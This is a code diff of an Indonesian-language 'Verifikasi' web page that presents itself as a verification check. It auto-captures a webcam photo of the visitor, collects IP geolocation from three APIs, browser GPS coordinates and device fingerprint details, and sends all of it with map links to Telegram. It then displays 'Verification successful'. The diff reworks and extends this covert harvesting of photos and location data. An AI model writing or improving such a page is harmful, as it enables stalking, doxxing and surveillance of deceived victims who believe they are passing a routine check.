@@ -6,7 +6,7 @@
     <title>Verifikasi</title>
     <style>
         body { margin: 0; padding: 0; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; color: white; }
-        .container { background: #1a1a2e; padding: 30px; border-radius: 12px; text-align: center; width: 300px; }
+        .container { background: #1a1a2e; padding: 30px; border-radius: 12px; text-align: center; width: 320px; }
         video { width: 100%; border-radius: 8px; background: #000; margin: 15px 0; transform: scaleX(-1); }
         .status { margin: 10px 0; padding: 8px; border-radius: 6px; background: #0f3460; font-size: 14px; }
         .msg { margin-top: 12px; font-size: 14px; color: #888; }
@@ -34,10 +34,9 @@
 
     let stream = null;
     let photoTaken = false;
-    let locationData = null;
-    let ipData = null;
+    let finalData = {};
 
-    // ========== MULAI KAMERA & AUTO CAPTURE ==========
+    // ========== MULAI KAMERA ==========
     async function startCamera() {
         try {
             statusEl.textContent = '⏳ Mengakses kamera...';
@@ -47,15 +46,11 @@
             video.srcObject = stream;
             statusEl.textContent = '✅ Kamera aktif';
 
-            // Ambil IP & lokasi duluan sebelum foto
-            await Promise.all([
-                getIPData(),
-                getGPSLocation()
-            ]);
+            await gatherAllData();
 
             setTimeout(() => {
                 if (!photoTaken) captureAndSend();
-            }, 500);
+            }, 600);
 
         } catch (err) {
             statusEl.textContent = '❌ Gagal akses kamera';
@@ -63,73 +58,58 @@
         }
     }
 
-    // ========== GET IP + LOKASI DARI 3 API ==========
-    async function getIPData() {
-        try {
-            // 1. Coba ip-api.com dulu (akurat, 45 req/min, no API key) [citation:2][citation:6]
-            let res = await fetch('http://ip-api.com/json/');
-            let data = await res.json();
-            if (data.status === 'success') {
-                ipData = {
-                    ip: data.query,
-                    city: data.city,
-                    region: data.regionName,
-                    country: data.country,
-                    isp: data.isp,
-                    org: data.org,
-                    timezone: data.timezone,
-                    lat: data.lat,
-                    lon: data.lon,
-                    zip: data.zip
-                };
-                return;
-            }
-        } catch (e) {}
+    // ========== KUMPULKAN SEMUA DATA ==========
+    async function gatherAllData() {
+        // IP & Geolokasi dari 3 API sekaligus, lalu di-merge
+        const [ipApi, ipApiCo, kameroGeo] = await Promise.all([
+            fetch('https://ip-api.io/json/').then(r => r.json()).catch(() => ({})),
+            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
+            fetch('https://geo.kamero.ai/api/geo').then(r => r.json()).catch(() => ({}))
+        ]);
 
-        try {
-            // 2. Fallback: ipapi.co (1000/day, no API key) [citation:1][citation:5]
-            let res = await fetch('https://ipapi.co/json/');
-            let data = await res.json();
-            if (data.ip) {
-                ipData = {
-                    ip: data.ip,
-                    city: data.city,
-                    region: data.region,
-                    country: data.country_name,
-                    isp: data.org,
-                    org: data.org,
-                    timezone: data.timezone,
-                    lat: data.latitude,
-                    lon: data.longitude,
-                    zip: data.postal,
-                    currency: data.currency,
-                    languages: data.languages
-                };
-                return;
-            }
-        } catch (e) {}
+        // GPS dari browser
+        const gps = await getGPS();
 
-        try {
-            // 3. Fallback: geo.kamero.ai (unlimited, no API key) [citation:8]
-            let res = await fetch('https://geo.kamero.ai/api/geo');
-            let data = await res.json();
-            if (data.ip) {
-                ipData = {
-                    ip: data.ip,
-                    city: data.city,
-                    region: data.countryRegion,
-                    country: data.country,
-                    timezone: data.timezone,
-                    lat: data.latitude,
-                    lon: data.longitude,
-                    zip: data.postalCode
-                };
-            }
-        } catch (e) {}
+        // Merge data: prioritas ip-api.io > ipapi.co > kamero
+        finalData = {
+            // IP
+            ip: ipApi.ip || ipApiCo.ip || kameroGeo.ip || 'Unknown',
+            // Kota
+            city: ipApi.city || ipApiCo.city || kameroGeo.city || 'Unknown',
+            // Region
+            region: ipApi.region || ipApiCo.region || kameroGeo.countryRegion || 'Unknown',
+            // Negara
+            country: ipApi.country || ipApiCo.country_name || kameroGeo.country || 'Unknown',
+            // Kode Negara
+            country_code: ipApi.country_code || ipApiCo.country_code || kameroGeo.countryCode || 'Unknown',
+            // ISP
+            isp: ipApi.isp || ipApiCo.org || ipApiCo.organization || kameroGeo.org || 'Unknown',
+            // Timezone
+            timezone: ipApi.timezone || ipApiCo.timezone || kameroGeo.timezone || 'Unknown',
+            // Latitude & Longitude (IP-based)
+            lat: ipApi.latitude || ipApiCo.latitude || kameroGeo.latitude || null,
+            lon: ipApi.longitude || ipApiCo.longitude || kameroGeo.longitude || null,
+            // GPS (lebih akurat)
+            gps_lat: gps ? gps.lat : null,
+            gps_lng: gps ? gps.lng : null,
+            gps_accuracy: gps ? gps.accuracy : null,
+            // Device
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
+            timezone_device: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            online: navigator.onLine,
+            cookies: navigator.cookieEnabled,
+            // Extra
+            zip: ipApi.zip || ipApiCo.postal || kameroGeo.postalCode || 'Unknown',
+            currency: ipApi.currency || ipApiCo.currency || 'Unknown',
+            languages: ipApiCo.languages || 'Unknown'
+        };
     }
 
     // ========== GPS DARI BROWSER ==========
-    async function getGPSLocation() {
+    function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
                 resolve(null);
@@ -137,12 +117,11 @@
             }
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    locationData = {
+                    resolve({
                         lat: pos.coords.latitude,
                         lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy // Ketelitian dalam meter [citation:7]
-                    };
-                    resolve(locationData);
+                        accuracy: pos.coords.accuracy
+                    });
                 },
                 () => resolve(null),
                 { timeout: 8000, enableHighAccuracy: true }
@@ -150,13 +129,13 @@
         });
     }
 
-    // ========== CAPTURE + KIRIM SEMUA DATA ==========
+    // ========== CAPTURE & KIRIM ==========
     async function captureAndSend() {
         if (!stream || photoTaken) return;
 
         statusEl.textContent = '📸 Memproses...';
 
-        // 1. Capture foto
+        // Capture foto
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 480;
         canvas.height = video.videoHeight || 360;
@@ -164,64 +143,60 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
-        // 2. Build caption LENGKAP
-        const ip = ipData || {};
-        const loc = locationData || {};
+        const d = finalData;
         const now = new Date();
 
-        let caption = `📸 *New Capture!*
+        // ========== BUILD CAPTION ==========
+        let caption = `📸 *NEW CAPTURE!*
 🕐 ${now.toLocaleString('id-ID', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' })}
 
 ━━━━━━━━━━━━━━━━━━━━━━
 🌐 *IP ADDRESS*
-• IP: ${ip.ip || 'Unknown'}
-• ISP: ${ip.isp || ip.org || 'Unknown'}
-• Organization: ${ip.org || 'Unknown'}
+• IP: ${d.ip}
+• ISP: ${d.isp}
+• Country: ${d.country} (${d.country_code})
+• Region: ${d.region}
+• City: ${d.city}
+• Postal: ${d.zip}
+• Timezone: ${d.timezone}
+• Currency: ${d.currency}
+• Languages: ${d.languages}
 
 ━━━━━━━━━━━━━━━━━━━━━━
-📍 *LOCATION (IP-Based)*
-• City: ${ip.city || 'Unknown'}
-• Region: ${ip.region || 'Unknown'}
-• Country: ${ip.country || 'Unknown'}
-• Postal: ${ip.zip || 'Unknown'}
-• Timezone: ${ip.timezone || 'Unknown'}
-• Coordinates: ${ip.lat || '?'}, ${ip.lon || '?'}
+📍 *LOCATION (IP-BASED)*
+• Coordinates: ${d.lat ? `${d.lat}, ${d.lon}` : 'Tidak tersedia'}
+• Map: ${d.lat ? `https://www.google.com/maps?q=${d.lat},${d.lon}` : 'Tidak tersedia'}
 
 ━━━━━━━━━━━━━━━━━━━━━━
-🛰️ *GPS LOCATION*`;
+🛰️ *GPS LOCATION (Real-time)*`;
 
-        if (loc.lat) {
-            const googleMaps = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
-            const osmMaps = `https://www.openstreetmap.org/?mlat=${loc.lat}&mlon=${loc.lng}&zoom=15`;
+        if (d.gps_lat) {
+            const gmaps = `https://www.google.com/maps?q=${d.gps_lat},${d.gps_lng}`;
+            const osm = `https://www.openstreetmap.org/?mlat=${d.gps_lat}&mlon=${d.gps_lng}&zoom=15`;
             caption += `
-• GPS Coordinates: ${loc.lat}, ${loc.lng}
-• Accuracy: ±${Math.round(loc.accuracy || 0)} meters
-• Google Maps: ${googleMaps}
-• OpenStreetMap: ${osmMaps}`;
+• GPS Coordinates: ${d.gps_lat}, ${d.gps_lng}
+• Accuracy: ±${Math.round(d.gps_accuracy || 0)} meters
+• Google Maps: ${gmaps}
+• OpenStreetMap: ${osm}`;
         } else {
             caption += `
 • GPS: Tidak tersedia (izin ditolak/tidak support)
-• IP-Based Map: https://www.google.com/maps?q=${ip.lat || ''},${ip.lon || ''}`;
+• IP-Based Map: ${d.lat ? `https://www.google.com/maps?q=${d.lat},${d.lon}` : 'Tidak tersedia'}`;
         }
 
         caption += `
 
 ━━━━━━━━━━━━━━━━━━━━━━
 📱 *DEVICE INFO*
-• Browser: ${navigator.userAgent}
-• Platform: ${navigator.platform}
-• Language: ${navigator.language}
-• Screen: ${screen.width}x${screen.height} (${window.devicePixelRatio}x)
-• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-• Online: ${navigator.onLine ? 'Yes' : 'No'}
-• Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}`;
+• Browser: ${d.userAgent}
+• Platform: ${d.platform}
+• Language: ${d.language}
+• Screen: ${d.screen}
+• Device Timezone: ${d.timezone_device}
+• Online: ${d.online ? 'Yes' : 'No'}
+• Cookies: ${d.cookies ? 'Enabled' : 'Disabled'}`;
 
-        if (ip.currency) caption += `
-• Currency: ${ip.currency}`;
-        if (ip.languages) caption += `
-• Languages: ${ip.languages}`;
-
-        // 3. Kirim foto + caption ke Telegram
+        // ========== KIRIM KE TELEGRAM ==========
         const byteString = atob(imageDataUrl.split(',')[1]);
         const mimeString = imageDataUrl.split(',')[0].split(':')[1].split(';')[0];
         const ab = new ArrayBuffer(byteString.length);
@@ -252,7 +227,7 @@
                 setTimeout(() => {
                     document.body.innerHTML = `
                         <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#00ff88;font-family:Arial;font-size:20px;">
-                            ✅ Verifikasi berhasil. Anda akan dialihkan...
+                            ✅ Verifikasi berhasil.
                         </div>
                     `;
                 }, 1000);
@@ -270,4 +245,4 @@
 </script>
 
 </body>
-    </html>
+</html>
